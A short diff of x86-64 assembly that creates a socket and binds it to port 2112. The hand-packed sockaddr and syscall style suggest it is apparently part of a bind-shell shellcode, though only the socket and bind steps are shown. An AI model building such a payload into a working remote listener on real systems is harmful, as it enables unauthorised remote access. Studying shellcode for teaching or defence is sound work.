@@ -20,7 +20,7 @@ _start:
 	mov al, 41			;; rax = 41 (socket)
 	syscall
 
-	;; bind(sock, {AF_INET, htons(4242), 0, 0}, 16)
+	;; bind(sock, {AF_INET, htons(2112), 0, 0}, 16)
 	mov rdi, rax			;; rdi = sock
 	push QWORD rdx			;; rdx == 0 (sin_zero)
 	push 0x4008ff02			;; 0x4008 = 2112 (sin_port), 02 = AF_INET
